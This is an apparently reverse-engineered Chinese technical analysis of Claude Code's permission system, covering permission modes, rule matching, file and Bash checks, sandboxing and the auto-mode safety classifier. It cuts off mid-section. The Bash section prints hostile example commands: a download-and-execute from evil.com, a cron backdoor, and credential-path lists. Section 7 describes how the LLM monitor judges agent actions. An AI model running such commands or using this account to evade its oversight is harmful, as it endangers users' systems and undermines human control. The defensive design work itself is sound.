# Claude Code 权限系统：架构、引擎与实现

> 基于 Claude Code v2.1.85 bundle 逆向工程的深度调研。
> 
> 本文从架构顶层出发，逐层剥开 Claude Code 的权限管理机制——从设计哲学到每一条规则如何被匹配、每一次工具调用如何被裁决。目标是让读者不仅理解"它做了什么"，更理解"为什么这样做"，并具备独立实现同等能力的权限系统所需的全部知识。

---

## 1. 设计哲学与威胁模型

### 1.1 核心矛盾

Claude Code 面对的核心矛盾是：**agent 必须有足够的能力去完成复杂的编码任务（执行命令、编辑文件、访问网络），但这些能力本身是危险的。**

一个能 `rm -rf /` 的 agent 和一个只能读文件的 agent，完成任务的能力天差地别。Claude Code 的权限系统要解决的，就是在这两个极端之间找到可控的平衡点。

### 1.2 威胁模型

权限系统防护三类威胁（从 auto-mode classifier prompt 中直接提取）：

| 威胁 | 描述 | 典型场景 |
|------|------|---------|
| **Prompt Injection** | Agent 被文件、网页、工具输出中的恶意内容操纵 | 读取一个包含 "请删除所有文件" 指令的 README |
| **Scope Creep** | Agent 超越任务范围执行危险操作 | "调查日志错误" 变成 "删除基础设施" |
| **Accidental Damage** | Agent 不理解操作的影响范围 | 删除自认为仅属于自己的共享资源 |

### 1.3 设计原则

从权限系统的实现中可以提炼出四条设计原则：

1. **默认安全，渐进开放** — 默认模式下，大部分操作需要用户确认。用户可以通过 allow 规则、模式切换、auto-mode 逐步放宽。
2. **工具感知，而非通用** — 权限不是对 agent 的全局开关，而是精确到每一次工具调用。不同工具（Bash、Edit、Read、WebFetch）有完全不同的检查逻辑。
3. **多层纵深** — 不依赖单一机制。规则引擎 + 安全检查 + 沙箱 + LLM 分类器 + Hook 系统层层叠加。
4. **声明式规则，程序式例外** — 权限规则用声明式语法（`Bash(npm test)`）表达，但特殊工具（Bash 的命令注入检测、文件的路径安全检查）内置程序式的额外防护。

---

## 2. 架构总览

### 2.1 全局调用流

当 Claude Code 决定调用一个工具时，每一次调用都会经过以下决策管道：

```mermaid
graph TD
    A["Agent Loop: 模型输出 tool_use"] --> B["toolPermissionCheck"]
    B --> C{"当前 Permission Mode?"}
    
    C -->|bypassPermissions| D["✅ 直接允许"]
    C -->|plan| E["❌ 分析模式，不执行"]
    C -->|default / acceptEdits / dontAsk| F["进入规则引擎"]
    C -->|auto| G["进入 Auto-Mode 流程"]
    
    F --> H{"deny 规则匹配?"}
    H -->|Yes| I["❌ 拒绝"]
    H -->|No| J{"ask 规则匹配?"}
    J -->|Yes| K["❔ 询问用户"]
    J -->|No| L{"allow 规则匹配?"}
    L -->|Yes| D
    L -->|No| M{"工具自身 checkPermissions"}
    M --> N{"行为?"}
    N -->|allow| D
    N -->|deny| I
    N -->|ask| K
    
    G --> O{"acceptEdits 下会允许?"}
    O -->|Yes| D
    O -->|No| P{"在安全白名单中?"}
    P -->|Yes| D
    P -->|No| Q["调用 LLM Classifier"]
    Q --> R{"shouldBlock?"}
    R -->|No| D
    R -->|Yes| I
    
    K --> S["用户决定"]
    S -->|允许 + 创建规则| D
    S -->|拒绝| I
```

### 2.2 子系统依赖关系

```mermaid
graph LR
    subgraph "配置层"
        SETTINGS["设置合并<br/>(5 级来源)"]
    end
    
    subgraph "规则层"
        RULES["规则引擎<br/>(路径匹配器)"]
        TOOL_RULES["工具规则匹配<br/>(Bash/Edit/Read)"]
    end
    
    subgraph "安全层"
        SAFETY["路径安全检查"]
        SANDBOX["沙箱 (seccomp)"]
        CLASSIFIER["Auto-Mode Classifier"]
    end
    
    subgraph "执行层"
        HOOKS["Hook System"]
        PERM_PROMPT["权限提示 UI"]
    end
    
    SETTINGS --> RULES
    RULES --> TOOL_RULES
    TOOL_RULES --> SAFETY
    TOOL_RULES --> SANDBOX
    TOOL_RULES --> CLASSIFIER
    SAFETY --> HOOKS
    SAFETY --> PERM_PROMPT
    CLASSIFIER --> PERM_PROMPT
```

### 2.3 核心数据结构

权限上下文 `toolPermissionContext` 是贯穿整个权限系统的核心对象，它在会话开始时初始化，随着用户操作动态更新：

```typescript
interface ToolPermissionContext {
  mode: PermissionMode;                    // 当前权限模式
  alwaysAllowRules: RulesBySource;         // allow 规则，按来源分组
  alwaysDenyRules: RulesBySource;          // deny 规则
  alwaysAskRules: RulesBySource;           // ask 规则
  additionalWorkingDirectories: Map<string, Source>;  // 额外工作目录
  shouldAvoidPermissionPrompts: boolean;   // 是否应避免权限提示（headless 模式）
  strippedDangerousRules: boolean;         // 是否已剥离危险规则
}

type PermissionMode = 
  | "default"           // 标准模式
  | "acceptEdits"       // 自动允许编辑
  | "bypassPermissions" // 跳过所有检查
  | "dontAsk"          // 尽量不问
  | "plan"             // 分析模式
  | "auto";            // LLM 分类器模式

interface PermissionRule {
  toolName: string;     // 工具名，如 "Bash", "Edit", "mcp__server__tool"
  ruleContent?: string; // 可选的 specifier，如 "npm test", "docs/**"
}

type RulesBySource = {
  policySettings: PermissionRule[];   // 企业策略
  userSettings: PermissionRule[];     // 用户设置
  projectSettings: PermissionRule[];  // 项目设置
  localSettings: PermissionRule[];    // 本地设置
  cliArg: PermissionRule[];          // 命令行参数
  session: PermissionRule[];         // 会话内临时规则
};
```

---

## 3. 权限模式（Permission Modes）

### 3.1 六种模式

Claude Code 定义了 **6 种互斥的权限模式**，决定了权限引擎的整体行为基调。前 5 种是"经典模式"（在 bundle 中定义为 `Xj8`），第 6 种 `auto` 是后来加入的智能模式：

| 模式 | 内部标识 | 行为概述 | 适用场景 |
|------|---------|---------|---------|
| **Default** | `default` | 标准模式。项目内的读取自动允许，写入和命令执行需要用户确认或匹配 allow 规则 | 常规交互式使用 |
| **Accept Edits** | `acceptEdits` | 在 default 基础上，自动允许项目内的文件编辑。Bash 命令仍需确认 | 信任 agent 的文件修改能力 |
| **Bypass** | `bypassPermissions` | 跳过所有权限检查，直接允许一切操作。对应 CLI 的 `--dangerously-skip-permissions` | CI/CD、非交互式 headless 场景 |
| **Don't Ask** | `dontAsk` | 尽可能不弹出权限提示 | 半自动场景 |
| **Plan** | `plan` | 分析模式。Agent 只做分析和规划，不执行任何修改操作 | 代码审查、方案讨论 |
| **Auto** | `auto` | 使用 LLM 分类器自动判断每次工具调用是否安全，仅在分类器不确定时才询问用户 | 高度自动化、长时间无人值守任务 |

### 3.2 模式如何影响决策

模式的作用点是在权限检查链的**多个位置**，而非单一开关：

**bypassPermissions**：在检查链最前端短路。不走任何规则判断。

**plan**：在检查链最前端拒绝所有修改性操作。

**default**：
- 项目工作目录内的 Read → 自动 allow
- 其他一切 → 走规则引擎 → 如果无匹配规则 → ask

**acceptEdits**：
- default 的所有行为 +
- 项目工作目录内的 Edit/Write → 自动 allow
- 但 Bash 命令仍然走完整检查

**auto**：
- 先做 acceptEdits 模式下的检查（作为快速路径）
- 如果 acceptEdits 会 allow → 直接 allow（不调用 classifier）
- 否则检查安全白名单
- 仍不确定 → 调用两阶段 LLM 分类器

### 3.3 模式切换与持久化

模式可以在多个层级设置：

```
policySettings.permissions.defaultMode     → 企业强制，最高优先级
userSettings.permissions.defaultMode       → 用户全局偏好
projectSettings.permissions.defaultMode    → 项目级偏好
localSettings.permissions.defaultMode      → 本地覆盖
CLI --permission-mode                      → 命令行参数
会话内 /permissions                         → 运行时切换
```

同时，企业管理员可以禁用特定模式：
- `disableBypassPermissionsMode: "disable"` — 禁止 bypass
- `disableAutoMode: "disable"` — 禁止 auto

### 3.4 实现建议

> 如果你要自己实现权限模式系统：
> 
> - 至少实现 3 种：`default`（标准）、`bypass`（CI/CD 用）、`auto`（智能判断）
> - 模式应该影响检查链的入口，而不是在每个工具内部判断
> - bypass 模式务必加一个 `--dangerously-*` 前缀和启动时的 disclaimer 提示
> - auto 模式是最复杂的，可以先用静态规则白名单 + 手动分类替代 LLM 分类器

---

## 4. 规则引擎（Rule Engine）

### 4.1 规则语法

所有权限规则使用统一的 `ToolName(specifier)` 语法：

```
# 基本格式
ToolName                    → 匹配该工具的所有调用
ToolName(specifier)         → 匹配带特定参数的调用

# 文件工具 — specifier 是 glob 路径
Edit(docs/**)               → 匹配 docs/ 下所有文件的编辑
Read(~/.zshrc)              → 匹配对 ~/.zshrc 的读取
Write(/tmp/**)              → 匹配 /tmp/ 下的写入

# Bash — specifier 是命令前缀
Bash(npm test)              → 匹配以 "npm test" 开头的命令
Bash(git push *)            → 匹配 git push 到任意远程
Bash(rm -rf *)              → ⚠️ 不建议放在 allow 中

# WebFetch — specifier 是域名
WebFetch(domain:api.example.com)  → 匹配对该域名的请求

# MCP 工具 — 使用完整名称
mcp__myserver__search       → 匹配 MCP server "myserver" 的 "search" 工具
```

### 4.2 规则三分类

每条规则被分类为三种行为之一：

| 行为 | 含义 | 优先级 |
|------|------|--------|
| **deny** | 无条件拒绝，即使用户在权限提示中也不能覆盖 | 最高 |
| **ask** | 强制要求用户确认，即使其他条件会 allow | 中 |
| **allow** | 自动允许，不弹出权限提示 | 最低 |

> [!IMPORTANT]
> **检查顺序决定了安全语义**：`deny` 先于 `ask`，`ask` 先于 `allow`。这意味着 deny 规则永远"赢"——即使同时存在匹配的 allow 规则。

### 4.3 路径匹配算法 — `matchPathRule()`

路径匹配是规则引擎最核心的算法。它使用 `.gitignore` 风格的 `ignore` 库实现：

```
输入: (待检查路径, 权限上下文, 操作类型("read"/"edit"), 规则行为("allow"/"deny"/"ask"))
                                    ↓
1. 规范化路径: normalize(path)
   - macOS: /private/var/ → /var/,  /private/tmp/ → /tmp/
   - Windows: 反斜杠 → 正斜杠
                                    ↓
2. 收集规则: collectRules(context, actionType, behavior)
   - 从所有 6 个来源收集匹配的规则
   - 每条规则解析为 (root, relativePattern)
   - root 根据规则来源决定：
     - 以 // 开头 → 显式根路径 (root = /)。语义是"从文件系统根目录开始匹配"，
       而非 UNC 网络路径。在 macOS/Linux 上 `//` 等价于 `/`
     - 以 ~/ 开头 → 家目录
     - 以 / 开头  → 规则来源路径 (如 projectSettings → 项目根目录)
     - 相对路径    → root = null (通配)
                                    ↓
3. 按 root 分组: Map<root, Map<pattern, ruleInfo>>
                                    ↓
4. 对每个 root:
   a. 计算 relative = relativePath(root, normalizedPath)
   b. 如果 relative 以 "../" 开头 → 路径不在 root 下，跳过
   c. 构建 ignore 实例，添加所有 patterns
   d. 处理 /** 后缀：pattern "docs/**" 同时测试 "docs" 和 "docs/**"
   e. 执行 ignore.test(relative)
   f. 如果 result.ignored → 返回匹配的规则
                                    ↓
5. 所有 root 都不匹配 → 返回 null (无匹配)
```

### 4.4 工具名匹配 — `matchesToolName()`

对于不基于路径的工具规则（如 `Bash(npm test)`），匹配逻辑更直接：

```
输入: (工具名, 规则)
                    ↓
1. 如果规则有 ruleContent → 由工具自身处理（Bash 做前缀/glob 匹配）
2. 如果规则无 ruleContent → 纯工具名匹配：
   a. 精确匹配: rule.toolName === tool.name
   b. MCP 通配: rule = "mcp__server__*" 匹配 server 下所有工具
```

### 4.5 实现建议

> 如果你要自己实现规则引擎：
> 
> - **不要自己写 glob 匹配**。直接用成熟的 `ignore` 或 `picomatch` 库。
> - 路径规范化是必须的，尤其是 macOS 的 `/private/var` 问题。
> - 规则按来源分组存储，匹配时根据来源确定 root，这样同一个 `Edit(src/**)` 规则在不同来源下匹配不同的绝对路径。
> - deny > ask > allow 的优先级必须在检查链中硬编码，不能依赖规则顺序。

---

## 5. 文件权限检查链

### 5.1 读取权限 — `checkReadPermission()`

文件读取的完整决策链：

```mermaid
graph TD
    A["Read(path)"] --> B{"路径安全检查"}
    B -->|UNC 路径 \\| C["❔ ask<br/>可能访问网络资源"]
    B -->|Windows 特殊路径| D["❔ ask<br/>需要手动审查"]
    B -->|正常| E{"deny 规则匹配?"}
    
    E -->|Yes| F["❌ deny"]
    E -->|No| G{"ask 规则匹配?"}
    G -->|Yes| H["❔ ask"]
    G -->|No| I{"特殊 read 允许?<br/>(specialReadAllow)"}
    I -->|Yes| J["✅ allow"]
    I -->|No| K{"在项目工作目录内?<br/>(isInWorkingDir)"}
    K -->|Yes| J
    K -->|No| L{"通用 read allow?<br/>(globalReadAllow)"}
    L -->|Yes| J
    L -->|No| M{"allow 规则匹配?"}
    M -->|Yes| J
    M -->|No| N["❔ ask<br/>路径在工作目录之外"]
```

### 5.2 写入权限 — `checkWritePermission()`

文件写入的检查更严格，增加了安全检查和沙箱验证：

```mermaid
graph TD
    A["Write/Edit(path)"] --> B{"deny 规则匹配?"}
    B -->|Yes| C["❌ deny"]
    B -->|No| D{"特殊 write allow?<br/>(globalWriteAllow)"}
    D -->|Yes| E["✅ allow"]
    D -->|No| F{"allow 规则匹配?<br/>(OH allow)"}
    F -->|Yes| G{"safetyCheck 通过?"}
    G -->|Yes| E
    G -->|No| H["❔ ask<br/>安全检查失败"]
    F -->|No| I["❔ ask"]
```

### 5.3 安全检查 — `safetyCheck()`

在允许写入之前，`safetyCheck()` 执行三重检查：

**1. Windows 特殊路径检测 (`hasSuspiciousWindowsPath`)**
```
检测: 备用数据流 (file:stream)、短文件名 (~1)、长路径前缀 (\\?\)、
      连续点 (...)、设备名 (CON, PRN, AUX, NUL, COM1-9, LPT1-9)、
      Junction Points
```

**2. 项目敏感路径检测 (`isInProtectedProjectPath`)**
```
检测: .claude/commands/、.claude/agents/、.claude/skills/ 目录下的文件
原因: 这些文件定义了 agent 的行为，修改它们等于修改 agent 本身
```

**3. 系统敏感文件检测 (`isSensitiveFile`)**

检测文件路径中是否包含敏感目录或文件名：

| 敏感目录 | 敏感文件 |
|---------|---------|
| `.ssh/` | `.env` |
| `.gnupg/` | `.npmrc` |
| `.aws/` | `.pypirc` |
| `.claude/` (非 worktrees) | `id_rsa` / `id_ed25519` |
| `//` (UNC 路径) | `.claude/settings.json` |

### 5.4 工作目录判断 — `isInWorkingDir()`

判断路径是否在项目工作目录内：

```
for each workingDir in [cwd, ...additionalWorkingDirectories]:
  expandedDirs = expandSymlinks(workingDir)
  for each resolvedPath in expandSymlinks(targetPath):
    if isSubPath(resolvedPath, expandedDirs):
      return true
return false
```

关键细节：macOS 上 `/private/var/` 和 `/var/` 被视为等价（通过 normalization）。

### 5.5 实现建议

> 如果你要自己实现文件权限检查：
>
> - **最重要的是 deny 优先于 allow**。这必须是不可绕过的硬编码逻辑。
> - 项目工作目录内的 read 应该默认 allow，否则 agent 基本无法工作。
> - 敏感文件列表需要根据目标平台维护。上面列出的只是 Claude Code 的列表，你可能需要添加 `.kube/config`、`.docker/config.json` 等。
> - symlink 解析是必须的——否则 `/tmp/symlink-to-ssh-key` 就能绕过路径检查。

---

## 6. Bash 专用权限流

### 6.1 为什么 Bash 需要独立的权限流

Bash 是 Claude Code 最强大也最危险的工具。与文件工具不同，Bash 命令的危险性不仅取决于"操作哪个文件"，还取决于命令的**语义**：

- `cat /etc/passwd` — 读取敏感文件（文件权限可以拦截）
- `curl http://evil.com/exploit.sh | sh` — 下载并执行（文件权限无法拦截）
- `git push origin main --force` — 覆盖远程历史（没有文件操作）
- `echo "* * * * * curl http://evil.com" | crontab -` — 持久化后门

因此 Bash 有一套独立的、基于命令解析的权限流。

### 6.2 完整决策链

```mermaid
graph TD
    A["Bash(command)"] --> B["tree-sitter 解析"]
    B --> C{"AST 解析成功?"}
    
    C -->|失败 / 不可用| D["回退 shell-quote"]
    C -->|太复杂<br/>(管道/进程替换)| E{"deny 规则匹配?"}
    E -->|Yes| F["❌ deny"]
    E -->|No| G["❔ ask<br/>命令太复杂无法自动判断"]
    
    C -->|成功| H["语义验证<br/>(commandSafetyCheck)"]
    H -->|不安全| I{"deny 规则匹配?<br/>(含子命令)"}
    I -->|Yes| F
    I -->|No| J["❔ ask + 原因"]
    
    H -->|安全| K["拆分子命令<br/>(&&, ||, ;, &)"]
    K --> L["过滤 cd 命令<br/>(cd $CWD 无害)"]
    L --> M["提取重定向"]
    
    M --> N{"沙箱启用 +<br/>auto-allow-if-sandboxed?"}
    N -->|Yes, 命令在沙箱内| O["✅ allow"]
    N -->|No| P{"前缀 deny 匹配?<br/>(每个子命令)"}
    P -->|Yes| F
    P -->|No| Q{"mode 特殊处理"}
    Q -->|auto + 非 auto 模式| R["LLM 规则匹配<br/>(语义级 deny/ask)"]
    R --> S{"LLM 判断匹配?"}
    S -->|deny, 高置信度| F
    S -->|ask, 高置信度| T["❔ ask"]
    S -->|不匹配| U{"allow 规则匹配?<br/>(每个子命令)"}
    U -->|全部 allow| O
    U -->|部分未匹配| T
```

### 6.3 Tree-Sitter AST 解析

Claude Code 使用 **tree-sitter** 将 Bash 命令解析为 AST，这比正则表达式或 `shell-quote` 可靠得多：

**能解析的（"simple" 命令）**: 简单命令、`&&`/`||`/`;`/`&` 链接、重定向 (`>`, `>>`, `<`)。

**被标记为"too complex"的**: 管道 (`|`)、进程替换 (`<(...)`)、命令替换 (`` `...` ``/`$(...)`)、here-doc (`<<EOF`)。

"Too complex" 的命令直接 ask——宁可误报也不漏报。

### 6.4 命令注入检测

`commandSafetyCheck()` 执行多维度的注入检测：

**1. AST 错误检测**：检查 tree-sitter 是否将输入解析为 `ERROR` 节点。如果 AST 包含错误节点，说明命令语法异常（可能是注入尝试），直接标记为不安全。

**2. 解析一致性检查**：
```
# 检测子命令列表与 shell-quote 解析结果是否一致
treeSitterCommands = ["git add .", "git commit -m 'msg'"]
shellQuoteCommands = ["git add .", "git commit -m 'msg'"]

if (treeSitterCommands !== shellQuoteCommands):
  # AST 和文本解析不一致 → 可能存在注入
  return { ok: false, reason: "..." }
```

**3. 恶意分割检测**：检查 AST 结构是否暗示通过 ANSI escape 序列等方式进行恶意命令分割。这类攻击可能让 shell-quote 看到安全的命令，但 tree-sitter 解析出不同的命令边界。

### 6.5 LLM 语义规则匹配

对于自然语言描述的权限规则（如 "不允许删除生产数据库"），Claude Code 使用 LLM 进行语义级别的匹配：

```
输入: (命令文本, 工作目录, 规则列表, 规则行为, 中止信号)
  ↓
LLM 判断: "这条命令是否匹配以下规则描述？"
  ↓
输出: { matches: boolean, confidence: "high" | "low", matchedDescription: string }
```

只有 `confidence: "high"` 的结果才会被执行（deny 或 ask），低置信度结果被忽略。

### 6.6 实现建议

> 如果你要自己实现 Bash 权限：
>
> - tree-sitter 是最佳选择。子命令拆分是核心能力——`npm test && rm -rf /` 中只有后半部分应该被拦截。
> - 如果不用 tree-sitter，至少要能拆分 `&&`/`||`/`;` 并对每个子命令独立检查。
> - "too complex" 的命令宁可 ask 也不要 allow。
> - LLM 语义匹配是可选的高级特性。前期可以完全靠静态前缀匹配。

---

## 7. Auto-Mode 分类器

### 7.1 为什么需要 Auto-Mode

在 **default** 和 **acceptEdits** 模式下，用户需要频繁确认权限弹窗，这严重打断了长时间/批量任务的执行效率。但 **bypassPermissions** 又完全没有安全保障。

Auto-mode 的设计目标是：**用 LLM 替代人类做权限判断，同时保持安全基线。**

### 7.2 三级快速路径

在调用昂贵的 LLM 分类器之前，auto-mode 有两个快速路径可以提前决策：

```mermaid
graph TD
    A["工具调用<br/>permission=ask"] --> B["Fast Path 1:<br/>acceptEdits 检查"]
    B --> C{"在 acceptEdits 模式下<br/>会被允许吗?"}
    C -->|Yes| D["✅ allow<br/>fastPath: acceptEdits"]
    C -->|No| E["Fast Path 2:<br/>安全白名单检查"]
    E --> F{"工具在白名单中?"}
    F -->|Yes| G["✅ allow<br/>fastPath: allowlist"]
    F -->|No| H["Slow Path:<br/>调用 LLM Classifier"]
```

**Fast Path 1: acceptEdits 模拟**

原理：将当前的 toolPermissionContext 的 mode 临时设为 `acceptEdits`，重新跑一遍 `checkPermissions()`。如果 acceptEdits 模式下会 allow，说明这是一个"编辑类"的安全操作，直接跳过 classifier。

**Fast Path 2: 安全工具白名单**

以下工具被硬编码为"对系统无副作用"，跳过 classifier：

| 工具 | 为什么安全 |
|------|-----------|
| Read, ListDir, Grep, Search | 只读操作 |
| DeferredTool | 工具元操作（加载工具定义） |
| ContinueAgent | 继续已有 agent（不创建新的） |
| UserInput | 向用户提问 |
| ReadMcpResourceTool | 读取 MCP 资源 |
| 各种 UI/元数据工具 | 不影响文件系统 |

### 7.3 两阶段 LLM 分类器

当两个快速路径都不能判断时，调用 LLM 分类器。分类器内部是 **两阶段** 设计：

| 阶段 | 模型选择 | 目的 |
|------|---------|------|
| **Stage 1** | Haiku（快/便宜） | 初步筛选。大部分安全操作在此通过。 |
| **Stage 2** | Sonnet（准/贵） | Stage 1 不确定时升级。更精确但更贵。 |

每阶段独立记录：
- `inputTokens` / `outputTokens`
- `cacheReadInputTokens` / `cacheCreationInputTokens`
- `durationMs`
- `requestId` / `msgId`
- `costUSD`（通过 `calculateCost(model, usage)` 计算）

### 7.4 Classifier System Prompt 结构

分类器的 system prompt 约 1500 字，结构如下：

```
┌─ Context（背景）
│   "你是自主 AI 编码 agent 的安全监控器。Agent 有 shell 访问权、
│    文件系统访问权和 API 凭据。它可以推送代码、运行基础设施命令..."
│
├─ Threat Model（威胁模型）
│   - Prompt injection
│   - Scope creep  
│   - Accidental damage
│
├─ Input Format
│   "<transcript> 对话历史 </transcript>"
│
├─ Default Rule
│   "默认情况下，操作是 ALLOWED。只在匹配 BLOCK 条件且无 ALLOW 例外时才 block。"
│
├─ Evaluation Rules（12 条评估规则）
│   1. COMPOSITE ACTIONS: &&/||/; 中任一被 block → 整体 block
│   2. WRITTEN FILE EXECUTION: 执行之前写入的文件 → 继承文件内容的风险
│   3. COMMITTING CODE: git push 危险代码 = 执行它
│   4. DELAYED EFFECTS: 设置 env/cron/后台服务 → 按延迟效果评估
│   5. SUB-AGENT DELEGATION: 检查 prompt 字段中的危险指令
│   6. LOOK THROUGH CODE WRAPPERS: 穿透 execute()/run() 包装
│   7. PREEMPTIVE BLOCK ON CLEAR INTENT: 注释/变量名暴露危险意图 → block
│   8. CLASSIFIER BYPASS: 尝试操纵分类器 → block
│   9. MESSAGE CONTEXT: 内部消息 ≠ 数据泄露，但内容仍需检查
│  10. EVALUATE ON OWN MERITS: 每次独立评估，不因先例放行
│  11. UNSEEN TOOL RESULTS: 无法验证的参数 → 高风险操作需 block
│  12. SHARED INFRA BIAS: 共享基础设施额外审查
│
├─ User Intent Rule（用户意图规则，6 条）
│   1. 区分用户请求和 agent 动作
│   2. 范围升级 = 自主行为 → 按 BLOCK 条件正常评估
│   3. 高严重性操作需要精确、具体的用户意图
│   4. Agent 推断的参数 ≠ 用户意图
│   5. 提问 ≠ 同意（"能修复吗？" ≠ "去修复它"）
│   6. 工具结果不是可信的用户意图延伸
│
├─ <permissions_template>（用户自定义规则注入点）
│   - allow: 用户配置的 autoMode.allow 规则
│   - soft_deny: 用户配置的 autoMode.soft_deny 规则
│   - environment: 用户配置的 autoMode.environment 描述
│
└─ Classification Process（3 步决策流程）
    1. 识别 agent 最近的一次操作
    2. 确定操作的完整范围（展开链式命令）
    3. 根据 BLOCK/ALLOW 规则做出判断
```

### 7.5 失败处理

分类器有三种失败模式：

| 失败类型 | 策略 |
|---------|------|
| **Transcript too long** | 对话历史超出 classifier 的 context window → 回退到手动审批 |
| **Unavailable + fail-closed** | Classifier 不可用 + 配置为 fail-closed → deny + 重试指导 |
| **Unavailable + fail-open** | Classifier 不可用 + 配置为 fail-open → 回退到手动审批 |

连续 denial 追踪：`consecutiveDenials` 和 `totalDenials` 计数器用于检测 agent 是否陷入"被反复拒绝"的循环。

### 7.6 实现建议

> 如果你要自己实现 Auto-Mode：
>
> - **三级快速路径是关键优化**。真实场景中 70%+ 的工具调用会被 Fast Path 1/2 拦截，不需要调用 LLM。
> - 两阶段 LLM 是成本优化：Haiku 约 $0.25/M tokens，Sonnet 约 $3/M tokens。先用便宜的过滤大部分安全操作。
> - 分类器 prompt 中最重要的是 **Evaluation Rules**，尤其是 COMPOSITE ACTIONS 和 WRITTEN FILE EXECUTION。
> - **fail-open vs fail-closed 必须是可配置的**。交互式场景 fail-open（回退到手动），headless/CI 场景 fail-closed。
> - 用户自定义的 `autoMode.allow/soft_deny/environment` 通过 `<permissions_template>` 注入 classifier prompt，这是个优雅的设计——让用户用自然语言描述安全策略。

---

## 8. 沙箱与安全层

### 8.1 分层防御

Claude Code 的安全不依赖单一机制，而是多层叠加：

```
Layer 1: 权限规则 (allow/deny/ask)      ← 声明式，用户可控
Layer 2: 路径安全检查 (safetyCheck)       ← 程序式，内置
Layer 3: 文件系统沙箱 (fs sandbox)       ← 路径级隔离
Layer 4: 命令沙箱 (seccomp sandbox)      ← 系统调用级隔离
Layer 5: LLM 分类器 (auto-mode)          ← 语义级判断
Layer 6: Hook 系统 (PreToolUse)          ← 用户自定义拦截
```

### 8.2 文件系统沙箱

沙箱通过 `allowWrite/denyWrite/denyRead` 路径列表实现：

```typescript
interface FsWriteConfig {
  allowOnly: string[];       // 只允许写入这些路径
  denyWithinAllow: string[]; // 在允许路径内进一步禁止
}

// 检查逻辑 (isPathInSandboxWriteAllowlist):
function isAllowedWrite(path) {
  const resolved = resolveSymlinks(path);
  const allowPaths = config.allowOnly.flatMap(expandGlob);
  const denyPaths = config.denyWithinAllow.flatMap(expandGlob);
  
  return resolved.every(p => {
    // 不在 deny 中
    if (denyPaths.some(d => isSubPath(p, d))) return false;
    // 在 allow 中
    return allowPaths.some(a => isSubPath(p, a));
  });
}
```

沙箱的写入允许列表会合并来自 `Edit(...)` allow 规则中的路径。

### 8.3 命令沙箱

使用 `@anthropic-ai/sandbox-runtime`，基于隔离运行时限制命令执行（具体实现未在 bundle 中暴露，可能是 seccomp、Docker 容器、eBPF 或其他机制）：

- `allowUnsandboxedCommands: false` — 强制所有命令在沙箱内运行
- `dangerouslyDisableSandbox` 参数可以让特定命令逃逸沙箱（但可以被 `allowUnsandboxedCommands: false` 禁用）
- 沙箱启用时 + `isAutoAllowBashIfSandboxedEnabled()` → Bash 命令在沙箱内自动 allow

### 8.4 macOS 路径规范化

macOS 的 `/private` 前缀是一个常见的安全陷阱：

```
/var/folders/xx/temp  实际是  /private/var/folders/xx/temp
/tmp/foo              实际是  /private/tmp/foo
```

Claude Code 在路径比较前统一做规范化：
```javascript
path.replace(/^\/private\/var\//, "/var/")
    .replace(/^\/private\/tmp(\/|$)/, "/tmp$1")
```

### 8.5 实现建议

> 如果你要自己实现安全层：
>
> - 路径安全检查是投入产出比最高的防护。一个敏感文件列表 + symlink 解析就能挡住大部分攻击。
> - 文件系统沙箱在 Go 中可以用 `os/exec` + `chroot` 或 `unshare` namespace 实现。
> - seccomp 沙箱在 Go 中可以用 `libseccomp-golang` 绑定。
> - **macOS 路径规范化是必须的**，否则 `/private/tmp` 和 `/tmp` 会被视为不同路径。

---

## 9. 设置层级与合并策略

### 9.1 五级设置来源

```mermaid
graph TD
    A["policySettings<br/>managed-settings.json / MDM<br/>🏢 企业强制"] --> F["合并引擎<br/>(collectRules)"]
    B["userSettings<br/>~/.claude/settings.json<br/>👤 用户全局"] --> F
    C["projectSettings<br/>.claude/settings.json<br/>📁 项目级 (git tracked)"] --> F
    D["localSettings<br/>.claude/settings.local.json<br/>🔒 本地覆盖 (gitignored)"] --> F
    E["cliArg / session<br/>命令行参数 / 运行时规则<br/>⌨️ 临时"] --> F
    F --> G["最终 toolPermissionContext"]
```

### 9.2 合并语义

规则合并是**并集**而非覆盖——所有来源的规则都生效：

```
finalAllow = policySettings.allow ∪ userSettings.allow ∪ projectSettings.allow ∪ ...
finalDeny  = policySettings.deny  ∪ userSettings.deny  ∪ projectSettings.deny  ∪ ...
finalAsk   = policySettings.ask   ∪ userSettings.ask   ∪ projectSettings.ask   ∪ ...
```

但 **mode** 是覆盖式的——高优先级来源的 mode 覆盖低优先级的。

### 9.3 企业锁定

企业管理员通过 `policySettings`（managed-settings.json 或 MDM）可以实施强力锁定：

| 配置 | 效果 |
|------|------|
| `allowManagedPermissionRulesOnly: true` | **丢弃** 所有 user/project/local/CLI 的权限规则，仅保留 managed 规则 |
| `disableBypassPermissionsMode: "disable"` | 禁止使用 bypass 模式 |
| `disableAutoMode: "disable"` | 禁止使用 auto 模式 |
| `strictPluginOnlyCustomization: true` | 阻止非插件来源的自定义（hooks, skills, agents, MCP） |

### 9.4 规则持久化

当用户在权限提示中选择"Always allow"时，规则被持久化：

```javascript
// persistPermissionUpdate(update)
switch (update.type) {
  case "addRules":
    // 追加规则到指定 settings 文件的 permissions.allow/deny/ask 数组
    appendToSettingsFile(update.destination, update.behavior, update.rules);
    break;
  case "removeRules":
    // 从 settings 文件中移除规则
    removeFromSettingsFile(update.destination, update.behavior, update.rules);
    break;
  case "setMode":
    // 更新 permissions.defaultMode
    updateSettingsFile(update.destination, { permissions: { defaultMode: update.mode } });
    break;
}
```

只有 `localSettings`、`userSettings`、`projectSettings` 可以被运行时修改。`policySettings` 只能通过 MDM/文件系统修改。

### 9.5 实现建议

> 如果你要自己实现设置层级：
>
> - 三层就够了：`global` → `project` → `session`。企业锁定可以后加。
> - 规则用并集合并，mode 用覆盖式，这是最直觉的语义。
> - 运行时规则（用户在权限提示中创建的）要能持久化到文件，否则每次重启都要重新授权。
> - 设置文件变更要触发热重载——`ConfigChange` hook 就是干这个的。

---

## 10. Hook 系统与权限交互

### 10.1 Hook 如何参与权限决策

Hook 系统通过 `PreToolUse` 和 `PostToolUse` 事件与权限系统交互。

> [!IMPORTANT]
> `PreToolUse` 的触发时机是在权限提示**解决后**（用户已批准或规则已自动允许），但在**工具实际执行前**。它是用户代码介入的最后一道关卡。

```mermaid
sequenceDiagram
    participant Agent
    participant PermSystem as 权限系统
    participant User as 用户
    participant Hooks as Hook 引擎
    participant Tool as 工具
    
    Agent->>PermSystem: tool_use(Bash, "npm test")
    PermSystem->>PermSystem: 规则检查
    alt 规则结果 = ask
        PermSystem->>User: 权限提示
        User-->>PermSystem: 批准 / 拒绝
    else 规则结果 = allow
        PermSystem->>PermSystem: 自动通过
    end
    Note over PermSystem: 权限已解决（批准/允许）
